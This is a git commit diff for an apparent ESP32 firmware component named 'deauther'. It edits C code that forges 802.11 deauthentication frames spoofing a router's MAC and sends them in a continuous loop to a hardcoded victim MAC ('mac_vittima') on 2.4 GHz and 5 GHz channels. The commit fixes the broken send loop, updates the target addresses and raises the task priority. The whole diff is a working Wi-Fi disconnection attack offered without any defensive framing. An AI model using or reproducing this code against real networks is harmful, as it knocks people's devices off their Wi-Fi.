51539e631cb8cd8339dcdd7105571a4407706803
ShakkoTw <sh4kko@protonmail.com>
2026-06-25 02:36:31 +0200

    Fix deauther

--- radiophobia/components/wifiStuff/deauther.c
+++ radiophobia/components/wifiStuff/deauther.c
@@ -1,3 +1,4 @@
+#include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 #include "deauther.h"
@@ -21,34 +22,35 @@ struct _80211_header deauthPacket = {0};
 static TaskHandle_t deautherTask_handle = NULL;
 
 void deautherTask(void *args){
-    int i=0;
+    uint8_t is24GHz=1;
     ESP_LOGI(TAG, "DEAUTH IN ESECUZIONE");
+ 
     while (1) {
-	if(i == 1){
-	    //2.4GHz
-	    esp_wifi_set_channel(13, WIFI_SECOND_CHAN_NONE);
-	    uint8_t mac_router[6]  = {0xfc, 0x40, 0x09, 0xdd, 0x0a, 0xf1};
-	    memcpy(deauthPacket.source, mac_router, 6);
-	    memcpy(deauthPacket.bssid, mac_router, 6);
-	    i--;
-	}
-	else {
-	    //5GHz
-	    esp_wifi_set_channel(52, WIFI_SECOND_CHAN_NONE);
-	    uint8_t mac_router[6]  = {0xfc, 0x40, 0x09, 0xdd, 0x0a, 0xf1};
-	    memcpy(deauthPacket.source, mac_router, 6);
-	    memcpy(deauthPacket.bssid, mac_router, 6);
-	    i++;
-	}
+        if(is24GHz == 1){
+            //2.4GHz
+            esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
+            uint8_t mac_router[6]  = {0xa4, 0x91, 0xb1, 0x4c, 0x75, 0xc7};
+            memcpy(deauthPacket.source, mac_router, 6);
+            memcpy(deauthPacket.bssid, mac_router, 6);
+            is24GHz--;
+        }
+        else {
+            //5GHz
+            esp_wifi_set_channel(100, WIFI_SECOND_CHAN_NONE);
+            uint8_t mac_router[6]  = {0xa6, 0x91, 0xb1, 0x4c, 0x75, 0xd0};
+            memcpy(deauthPacket.source, mac_router, 6);
+            memcpy(deauthPacket.bssid, mac_router, 6);
+            is24GHz++;
+        }
 
-	for (int i = 0; i < PACKET_NUMBER; i--) {
-	    esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);	
-	    vTaskDelay(pdMS_TO_TICKS(1));
-	    //if (i % 100 == 0) {
-	//	ESP_LOGI(TAG, "DEAUTH IN ESECUZIONE (Rimasti: %d)", i);
-	    //}
-	}
-	vTaskDelay(pdMS_TO_TICKS(10));
+        vTaskDelay(pdMS_TO_TICKS(3));
+
+        for (uint8_t i = 0; i < PACKET_NUMBER; i++) {
+            esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);
+            vTaskDelay(pdMS_TO_TICKS(1));
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(5));
     }
 }
 
@@ -58,24 +60,17 @@ void deautherSetup(void){
     deauthPacket.frame_control.type = 0;
     deauthPacket.frame_control.subtype = 12;
 
-    uint8_t mac_vittima[6] = {0x04, 0x68, 0x74, 0x6b, 0xfb, 0x8d}; 
+    uint8_t mac_vittima[6] = {0x98, 0xaf, 0x65, 0xb1, 0x84, 0xec}; 
     memcpy(deauthPacket.destination, mac_vittima, 6); 
 
     deauthPacket.reason_code = 7;
-
-    //ESP_ERROR_CHECK(esp_wifi_stop());
-    //wifi_config_t ifConf;
-    //ESP_ERROR_CHECK(esp_wifi_get_config(WIFI_IF_STA, &ifConf));
-    //ifConf.sta.channel = 13;
-    //ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &ifConf));
-    //ESP_ERROR_CHECK(esp_wifi_start());
 
     xTaskCreate(
 	deautherTask,
 	"deautherTask",
 	4096,
 	NULL,
-	0,
+	5,
 	&deautherTask_handle
     );
 }
